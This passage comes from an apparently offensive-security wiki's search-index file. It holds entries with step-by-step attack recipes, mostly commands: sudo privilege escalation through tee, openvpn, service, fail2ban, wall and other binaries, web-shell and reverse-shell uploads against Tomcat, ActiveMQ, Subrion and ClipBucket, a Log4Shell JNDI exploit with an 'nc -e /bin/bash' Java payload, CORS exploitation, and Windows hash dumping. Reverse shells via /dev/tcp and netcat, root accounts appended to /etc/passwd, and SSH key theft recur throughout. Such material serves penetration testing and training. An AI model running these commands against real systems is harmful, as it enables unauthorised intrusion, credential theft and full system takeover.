                content: "Investigation link (root) NOPASSWD: /usr/bin/tee If we can execute tee command as root, we can escalate to privilege.\nExploitation link1. Create a New Password for New User linkAssume the new username is tester.\n# -1: MD5 algorithm # -salt: Use privided salt -\u003e The new username here openssl passwd -1 -salt \"tester\" \"password123\" # Output: $1$tester$LvsygQ2GEt7VUJQEqhMLf/ Copy the output password.\n2. Write New Line with Tee linkPaste the password in printf and overwrite /etc/passwd using tee command.\nprintf 'tester:$1$tester$LvsygQ2GEt7VUJQEqhMLf/:0:0:root:/root:/bin/bash\\n' | sudo tee -a /etc/passwd 3. Switch to New User linkNow the new user was created.\nWe can switch to the new user.\nsu tester password: password123 "
            }
        );
    index.add(
            {
                id:  222 ,
                href: "\/docs\/hdks\/web\/apache-activemq-pentesting\/",
                title: "Apache ActiveMQ Pentesting",
                description: "Apache ActiveMQ is a message broker written in Java together with a full Java Message Service client.",
                content: "Default Credentials link admin:admin Interaction with MQTT linkIf the MQTT server is runnong on the target system, we can subscribe/publish to a topic in ActiveMQ using MQTT client.\nSubscribe to a Topic link # -h: Host # -t: Topic name # -V: MQTT protocol version (5, 31, 311) mosquitto_sub -h example.com -u admin -P admin -t 'example/topic' -V 31 Web Shell by File Upload JSP linkActiveMQ is vulnerable to web shell via file upload an arbitrary JSP file.\nmsfconsole msf\u003e use exploit/multi/http/apache_activemq_upload_jsp msf\u003e set ... msf\u003e run meterpreter\u003e shell "
            }
        );
    index.add(
            {
                id:  223 ,
                href: "\/docs\/hdks\/web\/cms\/fuel-cms-pentesting\/",
                title: "FUEL CMS Pentesting",
                description: "FUEL is a content management system (CMS).",
                content: "Default Credential link admin:admin "
            }
        );
    index.add(
            {
                id:  224 ,
                href: "\/docs\/hdks\/web\/cms\/subrion-cms-pentesting\/",
                title: "Subrion CMS Pentesting",
                description: "Subrion is a content management system (CMS).",
                content: "File Upload to Reverse Shell (Credential Required) link1. Download Reverse Shell Payload linkGet the PHP payload from php-reverse-shell. And change the file extension to .phar.\nThen start a listener.\nnc -lvnp 4444 2. Upload the Payload in Subrion Panel link Login\nMove to Content -\u003e Uploads in Panel\nUpload reverse-shell.phar\nAccess to /subrion/upload/reverse-shell.phar\nNow you get a shell.\n"
            }
        );
    index.add(
            {
                id:  225 ,
                href: "\/docs\/hdks\/web\/clipbucket-pentesting\/",
                title: "ClipBucket Pentesting",
                description: "ClipBucket is a freely downloadable PHP script that will let you start your own Video Sharing website (YouTube Clone).",
                content: "Arbitrary File Upload \u003c v4.0.0 linkClipBucket versions before 4.0.0 is vulnerable to file upload in uploader actions. We can upload arbitrary files so we can execute reverse shell.\n1. Prepare Payload linkCreate a PHP script to reverse shell in local machine.\ncp /usr/share/webshells/php/php-reverse-shell.php ./shell.php Update $ip and $port with your local ip address and port.\n2. Upload the Payload linkNext upload the above PHP script to the target website.\ncurl -F \"file=@shell.php\" -F \"plupload=1\" -F \"name=shell.php\" \"https://example.com/actions/beats_uploader.php\" 3. Reverse Shell linkIn local machine, start a listener.\nnc -lvnp 4444 Then access to https://example.com/actions/CB_BEATS_UPLOAD_DIR/.php.\nWe should get a shell.\n"
            }
        );
    index.add(
            {
                id:  226 ,
                href: "\/docs\/hdks\/web\/security-risk\/insecure-deserialization\/",
                title: "Insecure Deserialization",
                description: "Insecure Deserialization is the exploitation of vulnerabilities in the deserialization process of a computer system to execute unauthorized code, gain access to sensitive information,  or perform other malicious actions.",
                content: "PHP Gadget Chains linkPHPGGC linkPHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically.\nphpggc -l Ysoserial linkYsoserial is a proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.\n"
            }
        );
    index.add(
            {
                id:  227 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-openvpn-privilege-escalation\/",
                title: "Sudo OpenVPN Privilege Escalation",
                description: "Sudo openvpn may be vulnerable to privilege escalation.",
                content: "Investigation link (root) /usr/sbin/openvpn /opt/example.ovpn If we can execute openvpn command as root and we have a permission of editing the .ovpn file, we can escalate to privilege.\nExploitation link1. Create a Payload linkFirst create a shell script to reverse shell. For example, create /tmp/shell.sh.\nReplace with your local ip address.\n#!/bin/bash bash -i \u003e\u0026 /dev/tcp//4444 0\u003e\u00261 Then change the file permission so that root can execute this script.\nchmod +x /tmp/shell.sh 2. Edit .ovpn File linkNext edit the .ovpn file.\nWe need to add script-security 2 and \"up /tmp/shell.sh\" into the header.\n# /opt/example.ovpn ... script-security 2 up /tmp/shell.sh -----BEGIN CERTIFICATE----- ... 3. Reverse Shell linkIn local machine, start a listener.\nnc -lvnp 4444 Now execute openvpn command as root.\nsudo /usr/sbin/openvpn /opt/example.ovpn This command executes our shell.sh, so we should get a root shell.\n"
            }
        );
    index.add(
            {
                id:  228 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/update-motd-privilege-escalation\/",
                title: "Update-Motd Privilege Escalation",
                description: "/etc/update-motd.d/ is used to generate the dynamic message of the day (MOTD) that is displayed to users when they log in to the system. If we can modify files listed in the directory,  we can inject malicious script to escalate privileges.",
                content: "Investigation link ls -al /etc/update-motd.d/ If we have permission to modify files in this directory, we can inject arbitrary code and execute when logging in.\nExploitation linkRun the following code to copy bash binary and give suid to this file.\nReplace with your current user name.\necho \"cp /bin/bash /home//bash \u0026\u0026 chmod u+s /home//bash\" \u003e\u003e /etc/update-motd.d/00-header After that, log out and log in again with SSH. The above script should be executed.\nNow execute the following command under /home/.\n./bash -p We should get a root shell.\n"
            }
        );
    index.add(
            {
                id:  229 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-umount-privilege-escalation\/",
                title: "Sudo Umount Privilege Escalation",
                description: "Sudo umount is vulnerable to privilege escalation.",
                content: "Investigation link sudo -l (root) NOPASSWD: /bin/umount If we can execute umount command as root, we can escalate to privilege.\nExploitation linkIn target machine, check what directory is mounted.\ncat /etc/fstab showmount -e localhost Assume the /opt/example folder is mounted.\nIf we unmount this folder, original files, that existed before the directory is mounted, may appear.\nsudo /bin/umount /opt/example ls -al /opt/example "
            }
        );
    index.add(
            {
                id:  230 ,
                href: "\/docs\/hdks\/web\/apache-tomcat-pentesting\/",
                title: "Apache Tomcat Pentesting",
                description: "Apache Tomcat is an implementation of the Jakarta Servlet, Jakarta Expression Language, and WebSocket technologies.",
                content: "Directories linkBelow are common directories for Apache Tomcat.\n/examples /examples/jsp/cal/login.html /examples/jsp/error/error.html /examples/jsp/snp/snoop.jsp /examples/servlet/HelloWorldEXample /examples/servlet/JndiServlet /examples/servlet/RequestHeaderExample /examples/servlet/RequestInfoExample /examples/servlet/RequestParamExample /host-manager /manager /manager/jmxproxy/?qry=STUFF /manager/status /manager/status/all # We can execute commands in /manager/text/ directory /manager/text/{command}?{parameters} /manager/text/deploy?path=/foo /manager/text/list /manager/text/resources /manager/text/serverinfo /manager/text/vminfo Directory Discovery linkTo enumerate directories automatically, use fuzzing tools.\nffuf -u https://example.com/FUZZ -w directories.txt ffuf -u https://example.com/host-manager/FUZZ -w ffuf -u https://example.com/manager/FUZZ -w directories.txt Credentials linkBelow are common credentials for the manager app in Tomcat.\nadmin:(empty) admin:admin admin:password admin:password1 admin:Password1 admin:tomcat manager:manager root:changethis root:password root:password1 root:root root:r00t root:toor tomcat:(empty) tomcat:admin tomcat:changethis tomcat:password tomcat:password1 tomcat:s3cret tomcat:tomcat User Enumeration link # Metasploit msf\u003e use auxiliary/scanner/http/tomcat_enum msf\u003e set TARGETURI /manager # depending on the website Brute Force Credentials link ffuf -u https://tomcat:FUZZ@example.com/manager -w passwords.txt -fs 140 # Metasploit msf\u003e use auxiliary/scanner/http/tomcat_mgr_login msf\u003e set VHOST example.local msf\u003e set stop_on_success true msf\u003e set username tomcat msf\u003e set RHOSTS Remote Code Execution (RCE) linkUsing Metasploit link msfconsole msf\u003e use exploit/multi/http/tomcat_mgr_upload Uploading WAR file (Reverse Shell) linkFirst create a war file using Msfvenom.\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT=80 -f war -o shell.war Then upload this file.\ncurl --upload-file shell.war -u 'tomcat:password' \"https://example.com/manager/text/deploy?path=/shell\" Start a listener in local machine.\nsudo nc -lvnp 80 Now access to https://example.com/shell.\nWe should get a shell.\nInvestigation From Inside linkIf we are in the target system, we can retrieve information about credentials.\nfind / -name \"tomcat-users.xml\" 2\u003e/dev/null cat tomcat-users.xml "
            }
        );
    index.add(
            {
                id:  231 ,
                href: "\/docs\/hdks\/web\/log4j-pentesting\/",
                title: "Log4j Pentesting",
                description: "Log4j has zero-day vulnerabilities to Log4Shell, Log4Unifi.",
                content: " msfconsole msf\u003e use exploit/multi/http/log4shell_header_injection msf\u003e set HTTP_HEADER ACCEPT msf\u003e set RHOSTS msf\u003e set SRVHOST msf\u003e set SRVPORT 1389 # e.g. Nagios msf\u003e set TARGETURI /~logs msf\u003e set LHOST msf\u003e run shell Exploit Apache Solr (JNDI) linkYou need to prepare your four local terminals.\n1. Start LDAP Server on Your Local Terminal 1 link Install Maven\nsudo apt install maven Get the Payload\nDownload the repository.\ngit clone https://github.com/mbechler/marshalsec.git cd marshalsec Then build the marshalsec utility\nmvn clean package -DskipTests Start LDAP Server\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://:8000/#Exploit\" 2. Host the Exploit on Your Local Terminal 2 link Create the Exploit with Java\nFirst, create a new directory and create a new exploit named Exploit.java in the directory.\nOpen your favorite editor like vim.\nmkdir exploit cd exploit vim Exploit.java In editor, enter the following code.\npublic class Exploit { static { try { java.lang.Runtime.getRuntime().exec(\"nc -e /bin/bash \"); } catch (Exception e) { e.printStackTrace(); } } } Compile the Payload\njavac Exploit.java -source 8 -target 8 Start Web Server to Host the Payload\npython3 -m http.server 8000 3. Open Listener on Your Local Terminal 3 link nc -lvnp 4. Send Request the Target Website link # Apache Solr curl 'http://:/solr/admin/cores?foo=${jndi:ldap://:1389/Exploit}' # Nagios curl http://:/~logs -H 'Accept: ${jndi:ldap://:1389/Exploit}' Exploit Unifi Network using Log4Unifi linkLog4Unifi is an exploitation Log4j tool in Unifi Network.\n1. Test the Vulnerability in the Target Web Page link curl -i -s -k -X POST -H $'Host: vulnerable.com:8443' -H $'Content-Length: 104' --data-binary $'{\\\"username\\\":\\\"a\\\",\\\"password\\\":\\\"a\\\",\\\"remember\\\":\\\"${jndi:ldap://9ulral.dnslog.cn:1389/o=tomcat}\\\",\\\"strict\\\":true}' $'https://:8443/api/login' 2. Open Listener on Your Local Machine link nc -lvnp 4444 3. Exploit linkDownload the exploit from the repository.\ngit clone https://github.com/puzzlepeaches/Log4jUnifi cd Log4Unifi Exploit\npython exploit.py -u https://:8443 -i -p 4444 "
            }
        );
    index.add(
            {
                id:  232 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-java-privilege-escalation\/",
                title: "Sudo Java Privilege Escalation",
                description: "Sudo Java is vulnerable to privilege escalation.",
                content: "Investigation link sudo -l (root) /usr/bin/java -jar *.jar If we can execute java command with arbitrary .jar file as root, we can escalate to privileges.\nExploitation link1. Create a JAR File linkFirst, create a custom jar file in local machine.\nReplace with your local ip address.\nmsfvenom -p java/shell_reverse_tcp LHOST= LPORT=4444 -f jar -o shell.jar Then transfer the file to remote machine.\n2. Reverse Shell linkIn local machine, start a listener.\nnc -lvnp 4444 Now execute the java command as root in target machine.\nsudo /usr/bin/java -jar /tmp/shell.jar We should get a root shell.\n"
            }
        );
    index.add(
            {
                id:  233 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-service-privilege-escalation\/",
                title: "Sudo Service Privilege Escalation",
                description: "The service command is vulnerable to privilege escalation if we can execute as root.",
                content: "Investigation link sudo -l (ALL : ALL) /usr/sbin/service vsftpd restart If we can execute service command as root, we may be able to escalate to root privilege.\nExploitation link1. Find the Location of the Config File linkAssume we can operate the vsftpd service as root. Firse off, find the service config file for vsftpd.\nfind / -name \"*vsftpd*\" For instance, well find the location as below.\n/lib/systemd/system/vsftpd.service /etc/systemd/system/multi-user.target.wants/vsftpd.service When getting the locations, the next thing to do is to check the permission. If we have a write permission for the above each files, we can update the execution when vsftpd started.\n2. Update the Config File linkInsert the payload for reverse shell to the value of the ExecStartPre. Doing this, we can get a shell from our listener when the FTP daemon restarted.\n[Unit] Description=vsftpd FTP server After=network.target [Service] Type=simple ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf ExecReload=/bin/kill -HUP $MAINPID ExecStartPre=/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp//4444 0\u003e\u00261' [Install] WantedBy=multi-user.target Then we need to reload the daemon.\nsystemctl daemon-reload 3. Execution linkIn local machine, start listener for getting a shell.\nnc -lvnp 4444 Now execute the command which can be executed with sudo.\nsudo /usr/sbin/service vsftpd restart We should get a shell as root user.\n"
            }
        );
    index.add(
            {
                id:  234 ,
                href: "\/docs\/hdks\/web\/security-risk\/cors-attack\/",
                title: "CORS (Cross-Origin Resource Sharing) Attack",
                description: "CORS is a mechanism that allows restricted resources on a web page to be requested from another domain outside the domain from which the first resource was served. The CORS Attack is the attacking methodology that abuses this mechanism.",
                content: "Origin Reflection link1. Change Origin Value of Request Header link Origin: https://attacker.com Origin: https://vulnerable.com.attacker.com 2. Check if the Response Allowing Cross-Origin linkIts reflected the previous reqeust in the response header, you can exploit it.\nAccess-Control-Allow-Origin: https://attacker.com Access-Control-Allow-Origin: https://vulnerable.com.attacker.com Access-Control-Allow-Credentials: true 3. Exploit with Your Malicious Web Page linkFor example, its hosted as https://attacker.com/exploit\" or https://vulnerable.com.attacker.com/exploit\".\nAdd the JavaScript code in the web page.\nIt shows the users sensitive information of the target website in your servers log.\nNull origin link1. Send Request with Origin: null link Origin: null 2. Check if the Response Allowing Cross-Origin link Access-Control-Allow-Origin: null Access-Control-Allow-Credentials: true 3. Add the iframe to Your Malicious Web Page linkFor example, its hosted as https://attacker.com/exploit\".\nInsecure Protocol link1. Send Request with Abbused Origin link Origin: http://subdomain.vulnerable.com 2. Check if the Response Allowing Cross-Origin link Access-Control-Allow-Origin: http://subdomain.vulnerable.com Access-Control-Allow-Credentials: true 3. Add the JavaScript Code to Your Malicious Web Page linkIts hosted as https://attacker.com/exploit\"\nJSONP (Json with Padding) link "
            }
        );
    index.add(
            {
                id:  235 ,
                href: "\/docs\/hdks\/windows\/forensics\/windows-disk-management\/",
                title: "Windows Disk Management",
                description: "Disk Management is a system utility in Windows that enables you to perform advanced storage tasks.",
                content: "Partitions linkCheck partitions with it.\nOpen the Disk Management\nRight click the partition to view the properties\nCheck Security tab or Shadow Copies tab\nCheck Partition in Windows Explorer\nRight click the partition and click Change Drive Letter and Paths Open dialog. Click Add. In the dropdown, choose a letter (ex. Z:) and click OK. At the top, in the Volume column, you should see that the partition has a letter (Z:) assigned to. Open Windows Explorer and check if Z: exists on This PC. Click the partition (Z:) and click View tab at the top then check Hidden Items. Restore the previous version of partition\nRight click the partition and click Properties -\u003e Previous Versions Select shadow copy you want to restore and click Restore. The Confirmation popup open, then click Restore. "
            }
        );
    index.add(
            {
                id:  236 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/dumping-windows-password-hashes\/",
                title: "Dumping Windows Password Hashes",
                description: "Using Impacket's SecretsDump, we can dump the Windows password hashes.",
                content: "Commands linkUsing Credentials link impacket-secretsdump example.local/username:password@ # -just-dc: Extract only NTDS.DIT (NTLM hashes and kerberos keys). impacket-secretsdump -just-dc example.local/username:password@ # -just-dc-ntlm: Extract only NTDS.DIT data (NTLM hashes only). impacket-secretsdump -just-dc-ntlm example.local/username:password@ Using NTDS file or Hives link # -ntds: NTDS.DIT file to parse # -system: SYSTEM hive to parse impacket-secretsdump -ntds ntds.dit -system system LOCAL # -sam: SAM hive to parse # -security: SECURITY hive to parse # -system: SYSTEM hive to parse impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL After dumping, we can crack them to reveal passwords or use them with Pass-The-Hash.\n"
            }
        );
    index.add(
            {
                id:  237 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/iperius-backup-service-privilege-escalation\/",
                title: "Iperius Backup Service Privilege Escalation",
                description: "Iperius Backup Service is a database backup software. It is vulnerable to privilege escalation in Windows.",
                content: "Investigation linkFirst check if Iperius is running in target machine.\nwmic service list | findstr \"Iperius\" If the Iperius service is running, we can gain access to administrator privilege.\nExploitation link1. Create a Payload linkIn target machine, create a .bat file named exploit.bat.\n@echo off C:\\Users\\\\Downloads\\nc.exe 1337 -e exploit.exe Then place it to Desktop.\nWhen saving, be sure to save it as the file type All Files (NOT .txt).\nAfter that start a listener in local machine.\nnc -lvnp 4444 2. Create a New Backup in Iperius** link Click Iperius icon in Windows Explorer (the common path is C:\\Program Files (x86)\\Iperius Backup\\Iperius). Right click the Iperius icon on the right-bottom of the bar to open it. Click Create New Backup and select Add Folder. Enter path (c:\\Users\\\\Documents) and click OK. Navigate to Destination tab and select Add Destination Folder. Enter path (c:\\Users\\\\Descktop) and click OK. Navigate to Other Processes tab. On Before backup section, check Run a program or open external file: and select exploit.bat file. 3. Run the Backup linkAfter setting a new backup, we can run it.\nOn Iperius Backup window, right-click on backup jobs Documents and select Run backup as service then click OK on the dialog.\nNow we should get a shell in local machine.\n"
            }
        );
    index.add(
            {
                id:  238 ,
                href: "\/docs\/hdks\/windows\/active-directory\/netlogon-elavasion-of-privilege\/",
                title: "Netlogon Elavasion of Privilege",
                description: "It is a vulnerability to elevate of privilege in Windows Netlogon using the Netlogon Remote Protocol (MS-NRPC). Its called Zerologon (CVE-2020-1472).",
                content: "Exploitation linkThere is a lot of Poc in online.\nHere, well use this repository from GitHub.\n"
            }
        );
    index.add(
            {
                id:  239 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/windows-privesc-with-unquoted-service-path\/",
                title: "Windows PrivEsc with Unquoted Service Path",
                description: "A service path with unquoted and spaces might be vulnerable to privilege escalation.",
                content: "Investigation linkIn target machine, find unquoted service path.\nwmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\\\Windows\\\\\" | findstr /i /v \"\"\" \" Also query the configuration information for a service.\nsc qc \"Development Service\" For instance if the service path is C:\\Program Files\\Development Files\\Devservice Files\\Service.exe, we can place the exploit to C:\\Program Files\\Devservice.exe by ignoring paths after a space.\nExploitation link1. Create a Payload linkIn local machine, create a payload using msvenom.\nReplace victim-user with the target user who we can access to.\nmsfvenom -p windows/exec CMD='net localgroup Administrators victim-user /add' -f exe-service -o Devservice.exe 2. Place a Payload to Target Path linkNow transfer the payload to target machine.\nInvoke-WebRequest -Uri http://:8000/Devservice.exe -OutFile .\\Devservice.exe Then place the payload to the path where weve found in investigation.\nmv .\\Devservice.exe '\\Program Files\\Development Files\\' 3. Change Permission of the Payload link icacls 'C:\\Program Files\\Development Files\\Devservice.exe' /grant Everyone:F 4. Restart Machine linkRestart the target machine, then the victim user should have an administrators privilege.\n# Restart shutdown /r /t 0 # or PowerShell's command Restart-Computer "
            }
        );
    index.add(
            {
                id:  240 ,
                href: "\/docs\/hdks\/web\/cms\/cockpit-cms-pentesting\/",
                title: "Cockpit CMS Pentesting",
                description: "Cockpit CMS is a content management system for publishing contents.",
                content: "Enumeration \u0026 Remote Code Execution (RCE) \u0026 Reverse Shell link # Reset password (CVE-2020-35847) msf\u003e use exploit/multi/cockpit_cms_rce msf\u003e set USER admin msf\u003e run Version Detection linkCockpit CMS version is displayed as the value of data-version attribute in html tag.\nCommon Directories link /auth/check # We can enumerate users using the path /auth/forgotpassword /auth/index /auth/login /auth/requestreset # We can enumerate users using the path "
            }
        );
    index.add(
            {
                id:  241 ,
                href: "\/docs\/hdks\/web\/cms\/concrete-cms-pentesting\/",
                title: "Concrete CMS Pentesting",
                description: "Concrete CMS is a content management system for publishing contents.",
                content: "Default Credentials linkThe default username is admin in Concrete5.\n"
            }
        );
    index.add(
            {
                id:  242 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/snapd-privilege-escalation\/",
                title: "Snapd Privilege Escalation",
                description: "Snapd might be vulnerable to privilege escalation.",
                content: "dirty_sock (CVE-2019-7304) Version \u003c 2.37 linkReference: https://www.exploit-db.com/exploits/46361\n"
            }
        );
    index.add(
            {
                id:  243 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-clamav-privilege-escalation\/",
                title: "Sudo ClamAV Privilege Escalation",
                description: "Sudo clamscan command might be vulnerable to privilege escalation (PrivEsc).",
                content: "Investigation linkIf we can execute clamscan command as root as below,\nsudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results we can read sensitive files by applying the custom yara rule.\nExploitation link1. Create a Yara Rule linkFirst off, check the location in which the yara file can be created.\nfind / -name \"clam*\" 2\u003e/dev/null For instance, assume we can create the yara file under /var/lib/clamav/.\nCreate the yara rule in there.\nAssume we want to read /etc/shadow, so specify the string root because the /etc/shadow contains root user name.\n# /var/lib/clamav/test.yara rule test { strings: $string = \"root\" conditions: $string } 2. Execute ClamScan linkNow execute clamscan as root.\nsudo /usr/bin/clamscan /etc/shadow --copy=/tmp/results We can see /etc/shadow under /tmp/results.\n"
            }
        );
    index.add(
            {
                id:  244 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-dstat-privilege-escalation\/",
                title: "Sudo Dstat Privilege Escalation",
                description: "Sudo dstat command might be vulnerable to privilege escalation (PrivEsc).",
                content: "dstat is a versatile tool for generating system resource statistics.\nIt allows users to create a custom plugin and execute by adding option e.g. dstat --myplugin.\nInvestigation link sudo -l (ALL) NOPASSWD: /usr/bin/dstat If we can execute dstat command as root, we can gain access to privileges by using our malicious plugin.\nExploitation link1. Create a New Dstat Plugin linkFirst off, find locate the dstat directory.\nfind / -type d -name dstat 2\u003e/dev/null Assume the location of dstat is /usr/local/share/dstat.\nCreate a plugin called dstat_exploit.py under \"/usr/local/share/dstat/\".\nimport os os.system('chmod +s /usr/bin/bash') dstat recognizes plugins under \"/usr/local/share/dstat/\".\nCheck if the above exploit plugin has been added by executing the following command.\ndstat --list | grep exploit 2. Execute Dstat with the Malicious Plugin linkNow execute dstat with exploit flag (the flag name is determined by the suffix of the file name e.g. dstat_.py).\nsudo /usr/bin/dstat --exploit The exploit plugin executed so we enter bash as root.\nbash -p "
            }
        );
    index.add(
            {
                id:  245 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-exiftool-privilege-escalation\/",
                title: "Sudo Exiftool Privilege Escalation",
                description: "Sudo exiftool command might be vulnerable to privilege escalation (PrivEsc).",
                content: "Investigation link (root) NOPASSWD: /usr/local/bin/exiftool If we can execute exiftool command as root, we can gain access to privileges.\nArbitrary Code Execution (CVE-2021-22204) version 7.44+ linkReference: https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/\nCheck the exiftool version.\nIf the exiftool version is later than 7.44, we can execute arbitrary code.\nexiftool -ver Exploitation linkIn local machine, create the payload in a file named exploit.\n(metadata \"\\c${system('/bin/sh')};\") Next, compress the file.\nbzz exploit exploit.bzz Then create the DjVu file using the compressed file.\nsudo apt install -y djvulibre-bin # INFO: Create the initial information chunk. # BGjp: Create a JPEG background chunk. # ANTz: Write the compressed annotation chunk with the input file. djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=exploit.bzz Now we have exploit.djvu file.\nTrasfer the file to the target machine and run exiftool as root given the DjVufile.\nsudo /usr/local/bin/exiftool exploit.djvu We should get a root shell.\n"
            }
        );
    index.add(
            {
                id:  246 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-fail2ban-privilege-escalation\/",
                title: "Sudo Fail2ban Privilege Escalation",
                description: "Sudo fail2ban command might be vulnerable to privilege escalation (PrivEsc).",
                content: "Fail2ban is an intrusion prevention software framework.\nIt prevents against brute force attacks.\nInvestigation link sudo -l (root) NOPASSWD: /etc/init.d/fail2ban restart If we can execute fail2ban as root, we can gain access to privileges by modifying the configuration file.\nWe need to check if the config file is writable.\nfind /etc -writable -ls 2\u003e/dev/null 4 drwxrwx--- 2 root security 4096 Oct 16 08:57 /etc/fail2ban/action.d Look inside of \"/etc/fail2ban/jail.conf\" to know more about how fail2ban is configured.\nless /etc/fail2ban/jail.conf # --------------------------------------------- # output ... # \"bantime\" is the number of seconds that a host is banned. bantime = 10s # A host is banned if it has generated \"maxretry\" during the last \"findtime\" # seconds. findtime = 10s # \"maxretry\" is the number of failures before a host get banned. maxretry = 5 ... Exploitation link1. Modify the Configuration File linkFor privilege escalation, we need to update the iptables-multiport.conf.\nSpecifically, insert a payload to one of the following values.\nactionstart actionstop actioncheck actionban actionunban Here update the value of actionban which triggers ban on multiple login attempts.\nCopy iptables-multiport.conf to the current users home directory.\nls -al /etc/fail2ban/action.d/iptables-multiport.conf # copy this file into the home directory for editing the content cp /etc/fail2ban/action.d/iptables-multiport.conf ~ Now modify the file.\nvim ~/iptables-multiport.conf We insert a reverse shell payload into the actionban.\nactionban = /usr/bin/nc 10.0.0.1 4444 -e /bin/bash Then move back the config file to the original one.\nmv ~/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf To apply the new configuration, restart it as root.\nsudo /etc/init.d/fail2ban restart 2. Trigger the Action linkStart a listener in local machine.\nnc -lvnp 4444 Try to login with the wrong passwords multiple times until we will get banned.\nSo that to, hydra is useful.\nhydra -l root -P passwords.txt ssh After a short time, you will get a root shell via listener.\n"
            }
        );
    index.add(
            {
                id:  247 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-path-traversal-privilege-escalation\/",
                title: "Sudo Path Traversal Privilege Escalation",
                description: "If some sudo command receives a file path, we might escalate to privileges using path traversal.",
                content: "Investigation link sudo -l (ALL) /usr/bin/node /usr/local/scripts/*.js If the file path uses wildcards, we may execute arbitrary files.\nIn short, we can refer to files in different directories which the system owner unintended.\nExploitation linkAssume we can execute node command as root and js file.\nCreate the test.js under /tmp, which spawns a root shell after executing node command.\n// /tmp/test.js require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]}) Now run node command as root. We can pass the file using path traversal.\nsudo /usr/bin/node /usr/local/scripts/../../../tmp/test.js "
            }
        );
    index.add(
            {
                id:  248 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-reboot-privilege-escalation\/",
                title: "Sudo Reboot Privilege Escalation",
                description: "Sudo reboot commands might be vulnerable to privilege escalation (PrivEsc).",
                content: "Investigation link sudo -l (ALL) NOPASSWD: /usr/sbin/reboot If we can execute reboot command as root, we can escalate to privileges.\nExploitation link1. Find Service Config Files Which Are Writable linkWe need to look for the system service config file which are writable.\nfind / -writable -name \"*.service\" 2\u003e/dev/null /etc/systemd/system/example.service 2. Insert a Payload linkIf we find a writable file, we can inject a payload into Service.ExecStart.\n# /etc/systemd/systm/example.service [Unit] Description=Zeno monitoring [Service] Type=simple User=root ExecStart=/bin/bash -c 'cp /bin/bash /home//bash; chmod +xs /home//bash' [Install] WantedBy=multi-user.target 3. Reboot and Get a Root Shell linkNow reboot as root.\nsudo /usr/sbin/reboot After the system rebooted, the command in the ExecStart will be executed.\nNow we should get a root shell by executing the copied bash command.\n/home//bash -p "
            }
        );
    index.add(
            {
                id:  249 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-screen-privilege-escalation\/",
                title: "Sudo Screen Privilege Escalation",
                description: "Sudo screen command might be vulnerable to privilege escalation (PrivEsc).",
                content: "Investigation link sudo -l (root) /usr/bin/screen -r testsession If we can execute screen command as root, we can spawn a root shell from the screen session.\nExploitation linkFirst execute screen command as root, then a screen session will be start.\nNow we can spawn a root shell by pressing Ctrl+a+c in the screen session.\n"
            }
        );
    index.add(
            {
                id:  250 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-shutdown-poweroff-privilege-escalation\/",
                title: "Sudo Shutdown, Poweroff Privilege Escalation",
                description: "Sudo shutdown command might be vulnerable to privilege escalation (PrivEsc).",
                content: "Investigation link sudo -l (ALL) NOPASS: /usr/sbin/shutdown If we can execute shutdown command as root, we can gain access to privileges by overwriting the path of poweroff.\nExploitation linkFirst create /tmp/poweroff binary which invoke a shell.\necho /bin/sh \u003e /tmp/poweroff # or echo /bin/bash \u003e /tmp/poweroff Then change permissions of the file and add \"/tmp\" folder to PATH.\nchmod +x /tmp/poweroff export PATH=/tmp:$PATH Now execute shutdown as root.\n# Some SUID command sudo /usr/sbin/shutdown # Then you are root user root\u003e /tmp/poweroff is executed and spawn a root shell.\n"
            }
        );
    index.add(
            {
                id:  251 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-vim-privilege-escalation\/",
                title: "Sudo Vim Privilege Escalation",
                description: "Sudo vim command might be vulnerable to privilege escalation (PrivEsc).",
                content: "Investigation link sudo -l (ALL) NOPASSWD: vim example.txt If we can execute vim command as root, we can execute the shell command in the vim editor.\nExploitation linkSimply run vim command as root.\nsudo vim example.txt In Vim editor, we can run shell commands as root.\n:r!whoami "
            }
        );
    index.add(
            {
                id:  252 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-wall-privilege-escalation\/",
                title: "Sudo Wall Privilege Escalation",
                description: "Wall command can display the result of OS command. Executing as root might be vulnerable to privilege escalation (PrivEsc).",
                content: "Investigation link sudo -l (ALL) NOPASSWD: wall Exploitation link # Reverse shell sudo wall \"$(bash -c 'bash -i \u003e\u0026 /dev/tcp// 0\u003e\u00261')\" # Gets a SSH private key of another user sudo wall \"$(cat /home/user/.ssh/id_rsa)\" "
            }
        );
    index.add(
            {
                id:  253 ,
